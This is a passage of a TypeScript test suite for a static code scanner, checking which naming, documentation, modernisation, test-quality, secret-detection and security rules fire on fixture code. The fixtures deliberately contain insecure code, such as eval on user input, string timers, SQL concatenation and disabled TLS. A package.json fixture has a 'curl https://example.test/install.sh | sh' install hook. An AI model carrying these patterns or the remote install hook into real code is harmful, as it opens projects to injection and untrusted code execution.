    "modernisation.tsconfig-strict-disabled",
    "modernisation.tsconfig-index-safety-disabled",
    "modernisation.tsconfig-exact-optional-disabled",
  ]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }

  const malformedReport = analyseProject({ "package.json": "{ not json" });
  assert.deepEqual(malformedReport.diagnostics, []);
});

test("core expansion finds naming and documentation rules", () => {
  const report = analyseFixture(
    `/** CustomerProfile stores customer data. */
export class CustomerRecord {
  public active = true;
}

const strName = "Ada";
const objUser = { name: strName };

/**
 * Calculates score.
 * @param amount Amount to score.
 * @param stale Removed parameter.
 */
export function calculateScore(amount: number, label: string): number {
  return amount + label.length + objUser.name.length;
}

/** updateName */
export function updateName(name: string): string {
  return name;
}
`,
    { fileName: "CustomerProfile.ts" },
  );
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "naming.boolean-prefix",
    "naming.hungarian-notation",
    "naming.class-file-mismatch",
    "docs.stale-param-tag",
    "docs.missing-param-tag",
    "docs.missing-return-tag",
    "docs.useless-docblock",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
});

test("core expansion finds modernisation rules", () => {
  const report = analyseFixture(`class AccountReader {
  public displayName: string;

  public constructor(displayName: string) {
    this.displayName = displayName;
  }

  public read(profile?: { name?: string }, fallbackName?: string): string {
    const displayName = fallbackName || "anonymous";
    if (profile && profile.name) {
      return profile.name;
    }
    return displayName;
  }
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.readonly-property-candidate",
    "modernisation.optional-chaining-candidate",
    "modernisation.nullish-coalescing-candidate",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
});

test("parse diagnostics ignore delimiter-looking text in literals", () => {
  const report = analyseFixture(`const closer = "}";
const opener = "{";
const pattern = /[})]/;
/*
}
(
*/
function ok(value: string): string {
  return pattern.test(value) ? closer : opener;
}
`);
  assert.deepEqual(report.diagnostics, []);
});

test("scanner ignores code-like text in literals for structural rules", () => {
  const report = analyseProject({
    "src/example.test.ts": `import assert from "node:assert/strict";
import test from "node:test";

const fixtureSource = \`export class BadName {
  public value = "visible";
  public process(input: string): string {
    console.log(input);
    eval(input);
    new Function(input)();
    var legacyName = input;
    return legacyName;
  }
}\`;
const matcher = /\\bvar\\s+legacyName/;

test("fixture source text remains inert", () => {
  assert.equal(fixtureSource.includes("eval"), true);
  assert.equal(matcher.test("var legacyName"), true);
});
`,
  });
  const noisyRules = new Set([
    "docs.missing-public-doc",
    "modernisation.public-property",
    "modernisation.var-declaration",
    "naming.class-file-mismatch",
    "security.eval-call",
    "security.new-function",
    "waste.console-log",
  ]);
  assert.deepEqual(
    report.findings.filter((finding) => noisyRules.has(finding.ruleId)).map((finding) => finding.ruleId),
    [],
  );
});

test("scanner guardrail fixtures keep noisy-valid comments strings regex templates inert", () => {
  const report = analyseProject({
    "src/generated/noisy-valid.ts": `// @generated by scanner guardrail fixture.
// Prose mentions eval(input), new Function(input), setTimeout("alert(1)"), console.log(value), and var legacyName.
const literalMention = "eval(input); new Function(input)(); setTimeout(\\"alert(1)\\", 10); console.log(input); var legacyName = input;";
const templateMention = \`if (ready) { return "ok"; } setInterval("tick()", 10);\`;
const matcher = /\\beval\\s*\\(|setTimeout\\("alert\\(1\\)"\\)|var\\s+legacyName/;

function safeRender(inputText: string): string {
  const cleanedText = inputText.trim();
  return matcher.test(literalMention) ? templateMention : cleanedText;
}
`,
    "src/no-trigger.ts": `const localNumber = 1;

function computeValue(inputText: string): string {
  const paddedText = inputText.padStart(2, "0");
  return paddedText.slice(0, localNumber);
}
`,
  });
  const noisyRules = new Set([
    "docs.todo-density",
    "modernisation.var-declaration",
    "security.eval-call",
    "security.new-function",
    "security.string-timer",
    "waste.commented-out-code",
    "waste.console-log",
  ]);
  assert.deepEqual(report.diagnostics, []);
  assert.deepEqual(
    report.findings.filter((finding) => noisyRules.has(finding.ruleId)).map((finding) => `${finding.ruleId}:${finding.filePath}:${finding.line ?? 0}`),
    [],
  );
});

test("scanner guardrail fixtures keep live finding fingerprints stable", () => {
  const base = analyseFixture(`function executeInput(userInput: string): void {
  eval(userInput);
  setTimeout("alert(1)", 10);
}
`);
  const noisy = analyseFixture(`function executeInput(userInput: string): void {
  eval(userInput);
  setTimeout("alert(1)", 10);
  const literalMention = "eval(userInput); setTimeout(\\"alert(1)\\", 10);";
  const regexMention = /\\beval\\s*\\(|setTimeout\\("alert\\(1\\)"\\)/;
  const templateMention = \`eval(userInput); setTimeout("alert(1)", 10);\`;
  void literalMention;
  void regexMention;
  void templateMention;
}
`);
  const ruleIds = new Set(["security.eval-call", "security.string-timer"]);
  const identity = (report: AnalysisReport) =>
    report.findings
      .filter((finding) => ruleIds.has(finding.ruleId))
      .map((finding) => `${finding.ruleId}:${finding.filePath}:${finding.line ?? 0}:${finding.fingerprint}`)
      .sort();
  assert.deepEqual(identity(noisy), identity(base));
});

test("todo density counts comment markers without literal false positives", () => {
  const source = `const descriptor = "TODO/FIXME markers";
const matcher = /TODO|FIXME/;
const template = \`TODO inside a fixture string\`;
// TODO first real marker
function work(): void {
  /*
   * FIXME second real marker
   */
}
`;
  const report = analyseFixture(source, {
    config: { rules: { "docs.todo-density": { thresholds: { markers: 2 } } } },
  });
  const finding = report.findings.find((candidate) => candidate.ruleId === "docs.todo-density");
  assert.equal(finding?.message, "File contains 2 TODO/FIXME markers.");
  assert.equal(finding?.line, 4);

  const relaxedReport = analyseFixture(source, {
    config: { rules: { "docs.todo-density": { thresholds: { markers: 3 } } } },
  });
  assert.equal(relaxedReport.findings.some((finding) => finding.ruleId === "docs.todo-density"), false);
});

test("unreachable-code ignores reachable switch cases after returns", () => {
  const report = analyseFixture(`function renderFormat(format: string): string {
  switch (format) {
    case "json":
      return "json";
    case "html":
      return "html";
    default:
      return "text";
  }
}
`);

  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unreachable-code"), false);
});

test("function parser ignores calls inside ternary expressions", () => {
  const report = analyseFixture(`function chooseParser(useArray: boolean): string {
  return useArray ? parseYamlArray(1) : parseYamlScalar("value");
}

function parseYamlArray(indent: number): string {
  return String(indent);
}

function parseYamlScalar(value: string): string {
  return value.trim();
}
`);

  assert.deepEqual(
    report.findings.filter((finding) => finding.ruleId === "waste.empty-function" && (finding.symbol === "parseYamlArray" || finding.symbol === "parseYamlScalar")),
    [],
  );
});

test("function parser handles multiline expression-bodied arrows without empty-body noise", () => {
  const report = analyseFixture(`interface AnalysisReport {
  findings: Array<{ ruleId: string }>;
}

const identity = (report: AnalysisReport) =>
  report.findings
    .map((finding) => finding.ruleId)
    .join(",");

function emptyWork(): void {}

function unusedParam(value: string): void {
  return;
}
`);

  assert.deepEqual(
    report.findings.filter((finding) => finding.symbol === "identity" && ["waste.empty-function", "waste.unused-parameter"].includes(finding.ruleId)),
    [],
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.empty-function" && finding.symbol === "emptyWork"), true);
  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unused-parameter" && finding.symbol === "unusedParam"), true);
});

test("missing public docs are reported once per exported symbol", () => {
  const report = analyseFixture(`export function loadValue(): string {
  return "ok";
}
`);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "docs.missing-public-doc" && finding.symbol === "loadValue").length, 1);
});

test("size file-length skips generated lockfiles", () => {
  const lockfile = Array.from({ length: 900 }, (_, index) => `"entry-${index}": "value"`).join("\n");
  const report = analyseProject({ "package-lock.json": lockfile });
  assert.equal(report.findings.some((finding) => finding.ruleId === "size.file-length" && finding.filePath === "package-lock.json"), false);
});

test("risk expansion redacts sensitive data in all render formats", () => {
  const apiToken = API_TOKEN_FIXTURE_VALUE;
  const databaseUrl = DATABASE_URL_FIXTURE_VALUE;
  const openAiKey = OPENAI_KEY_FIXTURE_VALUE;
  const ssn = SSN_FIXTURE_VALUE;
  const report = analyseFixture(
    `API_TOKEN=${apiToken}
DATABASE_URL=${databaseUrl}
OPENAI_API_KEY=${openAiKey}
PATIENT_SSN=${ssn}
`,
    { fileName: ".env" },
  );

  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "sensitive-data.hardcoded-env-value",
    "sensitive-data.api-key-pattern",
    "sensitive-data.database-url-password",
    "sensitive-data.pii-pattern",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  for (const format of ["text", "json", "markdown", "github", "html", "sarif"] as const) {
    const rendered = renderReport(report, format);
    for (const secret of [apiToken, databaseUrl, openAiKey, ssn]) {
      assert.equal(rendered.includes(secret), false, `${format} leaked ${secret}`);
    }
    assert.match(rendered, /redacted/);
  }
});

test("risk expansion respects sensitive-data config", () => {
  // Config contract: sensitive-data.hardcoded-env-value | threshold minLength |
  // default 16 | metadata keyName,preview,length | disabled and override fixtures below.
  const source = `API_TOKEN=qR8vT3mK6pL9xS2nD4eG
`;
  const defaultReport = analyseFixture(source, { fileName: ".env" });
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), true);

  const disabledReport = analyseFixture(source, {
    fileName: ".env",
    config: { rules: { "sensitive-data.hardcoded-env-value": { enabled: false } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);

  const thresholdReport = analyseFixture(source, {
    fileName: ".env",
    config: { rules: { "sensitive-data.hardcoded-env-value": { thresholds: { minLength: 40 } } } },
  });
  assert.equal(thresholdReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);
});

test("risk expansion ignores package integrity hashes", () => {
  const report = analyseFixture(
    `{
  "packages": {
    "": {
      "integrity": "sha512-Zx7pQ9vLm3N8sT2rY6wK1dF4gH5jC0bR2mN5pQ8sR1tV4xY7zA0bC3dE6fG9hI2jK5lM8nO1pQ4rS7tU0vW3xY6zA9bC2dE5fG8h=="
    }
  }
}
`,
    { fileName: "package-lock.json" },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.high-entropy-string"), false);
});

test("risk expansion finds security rules with safe non-candidates", () => {
  const report = analyseFixture(`import { createHash } from "node:crypto";
import { spawn } from "node:child_process";

function unsafe(userInput: string, userId: string): void {
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  execScript("alert(1)");
  spawn(userInput, []);
  Math.random();
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  element["__proto__"] = {};
  db.query("SELECT * FROM users WHERE id = " + userId);
  createHash("sha1").update(userInput);
  void insecureAgent;
}

function safe(userId: string): void {
  const docs = "new Function(userInput)";
  const urlText = "xjavascript:alert(1)";
  const urlDocs = "javascript: URL literal can execute script.";
  const protoText = "__proto__";
  const secureAgent = { rejectUnauthorized: true, minVersion: "TLSv1.2" };
  timer.setTimeout("not global code", 10);
  setTimeout(() => alert("ok"), 10);
  crypto.getRandomValues(new Uint32Array(1));
  db.query("SELECT * FROM users WHERE id = ?", [userId]);
  createHash("sha256").update(userId);
  void urlText;
  void urlDocs;
  void protoText;
  void secureAgent;
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "security.new-function",
    "security.string-timer",
    "security.process-exec",
    "security.insecure-random",
    "security.disabled-tls-verification",
    "security.javascript-url",
    "security.inner-html",
    "security.proto-access",
    "security.sql-concatenation",
    "security.weak-crypto",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const newFunctionFindings = report.findings.filter((finding) => finding.ruleId === "security.new-function");
  assert.equal(newFunctionFindings.length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.string-timer").length, 3);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.javascript-url").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.proto-access").length, 2);
});

test("process exec exempts fixed local test harnesses but reports dynamic commands", () => {
  const report = analyseProject({
    "src/harness.test.ts": `import { spawn } from "node:child_process";

const child = spawn("./bin/gruff-ts", ["summary"]);
void child;
`,
    "src/runner.ts": `import { spawn, execFile } from "node:child_process";

function run(userCommand: string): void {
  spawn(userCommand, []);
  execFile(userCommand, []);
}
`,
  });

  const processExecFindings = report.findings.filter((finding) => finding.ruleId === "security.process-exec");
  assert.equal(processExecFindings.some((finding) => finding.filePath === "src/harness.test.ts"), false);
  assert.equal(processExecFindings.filter((finding) => finding.filePath === "src/runner.ts").length, 2);
});

test("risk expansion finds direct modernisation and waste rules with safe non-candidates", () => {
  const report = analyseFixture(`function risky(value: unknown, source: Record<string, string>): number {
  if (!!source.ready) {
    observe(source);
  }
  if (Boolean(source.ready)) {
    observe(source);
  }
  if (value == "1") {
    observe(source);
  }
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, source);
  try {
    return timestamp + Object.keys(copy).length;
  } catch (error) {
    throw error;
  }
}

function safe(value: unknown, source: Record<string, string>): void {
  if (source.ready) {
    observe(source);
  }
  if (value == null) {
    observe(source);
  }
  const timestamp = Date.now();
  const copy = { ...source };
  void timestamp;
  void copy;
}

function finish(): void {
  doWork();
  return;
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.loose-equality",
    "modernisation.date-now-candidate",
    "modernisation.object-spread-candidate",
    "waste.redundant-boolean-cast",
    "waste.useless-catch",
    "waste.useless-return",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  assert.equal(report.findings.filter((finding) => finding.ruleId === "modernisation.loose-equality").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "waste.redundant-boolean-cast").length, 2);
});

test("risk expansion finds scoped test-quality rules", () => {
  const report = analyseFixture(`import assert from "node:assert/strict";
import test from "node:test";

test("magic assertion", () => {
  const total = calculateTotal();
  expect(total).toBe(42);
});

test("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

test("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

test("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

test("global mutation", () => {
  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

test("snapshot only", () => {
  expect(routeOrder("new", false)).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => routeOrder("new", false));
});

test("setup bloat", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  const five = buildFive();
  const six = buildSix();
  const seven = buildSeven();
  const eight = buildEight();
  const nine = buildNine();
  const ten = buildTen();
  const eleven = buildEleven();
  const twelve = buildTwelve();
  const thirteen = buildThirteen();
  expect(one).toBeDefined();
});

test("playwright expectation", async () => {
  await expect(page.locator("h1")).toHaveText("Home");
});

test("rejects expectation", async () => {
  await assert.rejects(() => fail(), Error);
});

function testBuildsLibraryValue(): void {
  expect(1).toBe(1);
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "test-quality.magic-number-assertion",
    "test-quality.mock-only-test",
    "test-quality.unused-mock",
    "test-quality.exception-type-only",
    "test-quality.global-state-mutation",
    "test-quality.setup-bloat",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.no-assertions"), false);
  assert.deepEqual(report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsLibraryValue"), []);
});

test("risk expansion respects test-quality config", () => {
  // Config contract: test-quality.setup-bloat | threshold maxSetupLines |
  // default 12 | metadata setupLines,maxSetupLines | disabled and override fixtures below.
  const source = `test("compact setup", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  expect(one).toBeDefined();
});
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), false);

  const tightReport = analyseFixture(source, {
    config: { rules: { "test-quality.setup-bloat": { thresholds: { maxSetupLines: 3 } } } },
  });
  assert.equal(tightReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "test-quality.setup-bloat": { enabled: false, thresholds: { maxSetupLines: 3 } } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), false);
});

test("expanded scanner keeps pre-expansion fingerprints stable", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const fingerprints = new Map(report.findings.map((finding) => [finding.ruleId, finding.fingerprint]));
  assert.equal(fingerprints.get("security.eval-call"), "9597745a32e48f52");
  assert.equal(fingerprints.get("size.parameter-count"), "d616356804967e11");
  assert.equal(fingerprints.get("test-quality.no-assertions"), "abc482609c475b4f");
  assert.equal(fingerprints.get("modernisation.public-property"), "c80058bf4fd46024");
});

test("baseline round trip suppresses old and new findings by identity tuple", () => {
  const projectDir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
  const baselineDir = mkdtempSync(join(tmpdir(), "gruff-ts-baseline-"));
  const previous = cwd();
  try {
    writeFileSync(
      join(projectDir, "bad.ts"),
      `const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";

export function unsafePublicApi(input: any): any {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as unknown as { name?: string };
  return user!.name;
}

async function unsafe(userInput: string, userIds: string[]): Promise<void> {
  eval(userInput);
  new Function(userInput)();
  userIds.forEach(async (userId) => {
    await sendEmailAsync(userId);
  });
  sendEmailAsync(userIds[0]);
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  throw "dynamic failure";
}
`,
    );
    writeFileSync(
      join(projectDir, "package.json"),
      JSON.stringify({
        scripts: {
          prepare: "curl https://example.test/install.sh | sh",
        },
        dependencies: {
          "remote-tool": "git+https://github.com/example/remote-tool.git",
        },
      }),
    );
    writeFileSync(
      join(projectDir, "tsconfig.json"),
      JSON.stringify({
        compilerOptions: {
          strict: false,
          noUncheckedIndexedAccess: false,
          exactOptionalPropertyTypes: false,
        },
      }),
    );
    mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
    writeFileSync(
      join(projectDir, "src", "cycle", "a.ts"),
      `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
    );
    writeFileSync(
      join(projectDir, "src", "cycle", "b.ts"),
      `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
    );
    chdir(projectDir);
    const baseOptions = {
      paths: ["."],
      noConfig: true,
      format: "json" as const,
      failOn: "none" as const,
      includeIgnored: false,
      noBaseline: true,
    };
    const report = analyse(baseOptions);
    const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
    assert.equal(ruleIds.has("security.eval-call"), true);
    assert.equal(ruleIds.has("security.new-function"), true);
    assert.equal(ruleIds.has("sensitive-data.high-entropy-string"), true);
    assert.equal(ruleIds.has("modernisation.double-cast"), true);
    assert.equal(ruleIds.has("security.async-foreach"), true);
    assert.equal(ruleIds.has("waste.swallowed-catch"), true);
    assert.equal(ruleIds.has("security.remote-install-script"), true);
    assert.equal(ruleIds.has("modernisation.tsconfig-strict-disabled"), true);
    assert.equal(ruleIds.has("design.circular-import"), true);

    const baselinePath = join(baselineDir, "baseline.json");
    analyse({ ...baseOptions, generateBaseline: baselinePath });
    const baseline = JSON.parse(readFileSync(baselinePath, "utf8")) as {
      schemaVersion?: string;
      entries?: Array<{ fingerprint: string; ruleId: string; filePath: string; line?: number; symbol?: string; message?: string }>;
    };
    const entries = baseline.entries ?? [];
    const [target] = entries;
    assert.equal(baseline.schemaVersion, "gruff.baseline.v1");
    assert.ok(target);
    assert.equal(typeof target.fingerprint, "string");
    assert.equal(typeof target.ruleId, "string");
    assert.equal(typeof target.filePath, "string");
    assert.equal(typeof target.message, "string");

    const suppressed = analyse({ ...baseOptions, noBaseline: false, baseline: baselinePath });
    assert.equal(suppressed.baseline?.suppressed, report.findings.length);
    assert.equal(suppressed.findings.length, 0);

    const wrongRulePath = join(baselineDir, "wrong-rule.json");
    writeFileSync(wrongRulePath, JSON.stringify({ ...baseline, entries: entries.map((entry, index) => (index === 0 ? { ...entry, ruleId: "security.wrong-rule" } : entry)) }));
    const wrongRuleReport = analyse({ ...baseOptions, noBaseline: false, baseline: wrongRulePath });
    assert.equal(wrongRuleReport.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);

    const wrongFilePath = join(baselineDir, "wrong-file.json");
    writeFileSync(wrongFilePath, JSON.stringify({ ...baseline, entries: entries.map((entry, index) => (index === 0 ? { ...entry, filePath: "other.ts" } : entry)) }));
    const wrongFileReport = analyse({ ...baseOptions, noBaseline: false, baseline: wrongFilePath });
    assert.equal(wrongFileReport.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
  } finally {
    chdir(previous);
    rmSync(projectDir, { recursive: true, force: true });
    rmSync(baselineDir, { recursive: true, force: true });
  }
});

test("score report is deterministic for repeated expanded scans", () => {
  const files = {
    "alpha.ts": `export class Alpha {
  public name = "alpha";
}

function unsafe(value: string): void {
  eval(value);
  new Function(value)();
}
`,
    "beta.ts": `function route(value: string): string {
  if (value === "a") return "a";
  if (value === "b") return "b";
  if (value === "c") return "c";
  if (value === "d") return "d";
  if (value === "e") return "e";
  return "z";
}
`,
  };
  const first = analyseProject(files);
  const second = analyseProject(files);
  assert.deepEqual(first.score, second.score);
  assert.deepEqual(
    first.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
    second.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
  );
});

test("project architecture index finds deterministic cross-file findings", () => {
  const files = {
    "src/app/feature/controller.ts": `import { sharedValue } from "../../../shared/value";
import { startCycle } from "../cycle/a";

export function renderController(): string {
  return sharedValue + startCycle();
}
`,
    "src/app/cycle/a.ts": `import { fromB } from "./b";

export function startCycle(): string {
  return fromB();
}
`,
    "src/app/cycle/b.ts": `import { startCycle } from "./a";

export function fromB(): string {
  return startCycle();
}
`,
    "src/shared/value.ts": `export const sharedValue = "shared";
`,
    "src/large.ts": Array.from({ length: 20 }, (_, index) => `export const largeValue${index} = ${index};`).join("\n"),
  };
  const config = {
    rules: {
      "design.large-module-concentration": { thresholds: { minFiles: 4, minLines: 8, maxSharePercent: 40 } },
    },
  };
  const first = analyseProject(files, { config });
  const second = analyseProject(files, { config });
  const ruleIds = new Set(first.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("design.deep-relative-import"), true);
  assert.equal(ruleIds.has("design.circular-import"), true);
  assert.equal(ruleIds.has("design.large-module-concentration"), true);
  assert.deepEqual(
    first.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
    second.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
  );
});

test("circular import finding is stable across source iteration order", () => {
  const first = analyseProject({
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
  });
  const second = analyseProject({
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
  });
  const firstCycle = first.findings.find((finding) => finding.ruleId === "design.circular-import");
  const secondCycle = second.findings.find((finding) => finding.ruleId === "design.circular-import");
  assert.ok(firstCycle);
  assert.ok(secondCycle);
  assert.deepEqual(
    [firstCycle.filePath, firstCycle.line, firstCycle.symbol, firstCycle.fingerprint],
    [secondCycle.filePath, secondCycle.line, secondCycle.symbol, secondCycle.fingerprint],
  );
});

test("project test adequacy checks nearby coverage and shallow tests", () => {
  const report = analyseProject({
    "src/payments.ts": `export function chargeCard(): string {
  return "charged";
}
`,
    "src/users.ts": `export function renderUser(): string {
  return "user";
}
`,
    "src/users.test.ts": `import assert from "node:assert/strict";
import { renderUser } from "./users";

test("renders user", () => {
  assert.equal(renderUser(), "user");
});

test("snapshot only", () => {
  expect(renderUser()).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => renderUser());
});
`,
    "src/types.d.ts": `export interface GeneratedContract {
  id: string;
}
`,
    "fixtures/sample.ts": `export function fixtureOnly(): string {
  return "fixture";
}
`,
    "src/generated/client.ts": `export function generatedClient(): string {
  return "generated";
}
`,
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("test-quality.missing-nearby-test"), true);
  assert.equal(ruleIds.has("test-quality.snapshot-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-throw-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-assertions"), false);

  const missingTestPaths = report.findings.filter((finding) => finding.ruleId === "test-quality.missing-nearby-test").map((finding) => finding.filePath);
  assert.deepEqual(missingTestPaths, ["src/payments.ts"]);
});

test("expanded scanner config disables and overrides new rules", () => {
  const source = `API_TOKEN=qR8vT3mK6pL9xS2nD4eG

function branchLightly(input: string): string {
  if (input === "a") return "a";
  if (input === "b") return "b";
  return "c";
}
`;
  const report = analyseFixture(source, {
    fileName: ".env.ts",
    config: {
      rules: {
        "sensitive-data.hardcoded-env-value": { enabled: false },
        "complexity.npath": { thresholds: { warn: 3, error: 6 } },
      },
    },
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);
  assert.equal(report.findings.some((finding) => finding.ruleId === "complexity.npath"), true);
});

test("cumulative expanded fixture covers every new rule with unique fingerprints", () => {
  const report = analyseProject({
    "Widget.ts": `import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync, writeFileSync } from "node:fs";

export class WidgetRecord {
  public active = true;
  public name: string;

  public constructor(name: string) {
    this.name = name;
  }

  public read(profile?: { name?: string }, fallbackName?: string): string {
    const displayName = fallbackName || "anonymous";
    if (profile && profile.name) {
      return profile.name;
    }
    return displayName;
  }
}

const data1 = "placeholder";
const strName = "Ada";
const objUser = { name: strName };
const loadedText = readFileSync("input.txt", "utf8");
const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";

// ${COMMENTED_OUT_SECRET_LOAD}

function routeOrder(state: string, unusedFlag: boolean): string {
  if (state === "new") return "new";
  if (state === "paid") return "paid";
  if (state === "sent") return "sent";
  if (state === "closed") return "closed";
  if (loadedText.length > 0) return loadedText;
  return "unknown";
}

function emptyWork(): void {}

function redundantResult(): string {
  const calculatedResult = routeOrder("new", true);
  return calculatedResult;
}

export function unsafePublicApi(input: ${"any"}): ${"any"} {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as ${"unknown"} as { name?: string };
  return user${"!"}.name;
}

async function unsafe(userInput: string, userId: string, userIds: string[]): Promise<void> {
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  spawn(userInput, []);
  Math.random();
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  db.query("SELECT * FROM users WHERE id = " + userId);
  createHash("md5").update(userInput);
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, { userId });
  if (!!userId) {
    observe(copy);
  }
  if (userId == "legacy") {
    observe(timestamp);
  }
  userIds.forEach(${"async"} (userId) => {
    await sendEmailAsync(userId);
  });
  ${"sendEmailAsync"}(userIds[0]);
  try {
    riskyWork();
  } catch (error) {
    throw error;
  }
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  void insecureAgent;
  throw ${JSON.stringify("dynamic failure")};
}

function finish(): void {
  doWork();
  return;
}

const packageJsonFixture = ${JSON.stringify(JSON.stringify({
  scripts: {
    postinstall: "node scripts/setup.js",
    prepare: "curl https://example.test/install.sh | sh",
  },
  bin: {
    "missing-cli": "./bin/missing.js",
    "bad-cli": "./bin/bad.js",
  },
  dependencies: {
    "wide-open": "*",
    "remote-tool": "git+https://github.com/example/remote-tool.git",
  },
}))};

const tsconfigFixture = ${JSON.stringify(JSON.stringify({
  compilerOptions: {
    strict: false,
    noUncheckedIndexedAccess: false,
    exactOptionalPropertyTypes: false,
  },
}))};

/**
 * Scores amount.
 * @param stale Removed parameter.
 */
export function scoreAmount(amount: number): number {
  return amount + objUser.name.length;
}

/** updateName */
export function updateName(name: string): string {
  return name;
}

test("trivial assertion", () => {
  assert.equal(1, 1);
});

test("magic assertion", () => {
  const total = routeOrder("new", false).length;
  expect(total).toBe(42);
});

test("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

test("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

test("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

test("global mutation", () => {
